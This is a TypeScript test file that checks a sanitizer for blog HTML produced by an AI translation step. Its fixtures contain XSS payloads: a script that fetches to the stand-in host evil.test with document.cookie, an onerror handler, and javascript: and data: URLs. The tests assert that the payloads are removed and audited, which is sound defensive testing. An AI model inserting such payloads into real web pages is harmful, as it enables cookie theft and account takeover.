import { afterEach, describe, expect, it, vi } from "vitest";

import { prepareTranslatedHtml, stripCodeFences } from "./sanitize-audit";

/** Simulates the AI translation step returning attacker-influenced HTML. */
const fakeTranslate = (output: string) =>
  prepareTranslatedHtml(output, `<p>orijinal</p>`, {
    source: "ai-translation",
    postId: "post-1",
    lang: "en",
  });

afterEach(() => {
  vi.restoreAllMocks();
});

describe("translated blog HTML pipeline", () => {
  it("strips markdown code fences around HTML", () => {
    expect(stripCodeFences("```html\n<p>hi</p>\n```")).toBe("<p>hi</p>");
  });

  it("blocks XSS injected by the translation model", () => {
    const out = fakeTranslate(
      '```html\n<p>Hello</p><script>fetch("https://evil.test?c="+document.cookie)</script><img src=x onerror=alert(1)>\n```',
    );
    expect(out).toContain("<p>Hello</p>");
    expect(out).not.toMatch(/<script|onerror|evil\.test/i);
  });

  it("blocks XSS smuggled through link and image URLs", () => {
    const out = fakeTranslate(
      `<a href="javascript:alert(1)">a</a><img src="data:text/html,<script>alert(1)</script>">`,
    );
    expect(out).not.toMatch(/javascript:|data:text\/html|<script/i);
    expect(out).toContain("<a>a</a>");
  });

  it("falls back to the sanitized original when the model returns nothing", () => {
    expect(fakeTranslate("")).toBe("<p>orijinal</p>");
  });

  it("audits dangerous markup as a warning", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    fakeTranslate(`<p>x</p><script>alert(1)</script>`);
    expect(warn).toHaveBeenCalledTimes(1);
    const line = String(warn.mock.calls[0]?.[0]);
    expect(line).toContain("[sanitize-audit]");
    expect(line).toContain("ai-translation");
    expect(line).toContain("post-1");
    expect(line).toContain("script");
  });

  it("logs cosmetic normalization at info level only", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const info = vi.spyOn(console, "info").mockImplementation(() => {});
    fakeTranslate(`<p>unclosed`);
    expect(warn).not.toHaveBeenCalled();
    expect(info).toHaveBeenCalledTimes(1);
  });

  it("stays silent for clean markup", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const info = vi.spyOn(console, "info").mockImplementation(() => {});
    const out = fakeTranslate(`<p>Clean <strong>text</strong></p>`);
    expect(out).toBe(`<p>Clean <strong>text</strong></p>`);
    expect(warn).not.toHaveBeenCalled();
    expect(info).not.toHaveBeenCalled();
  });
});
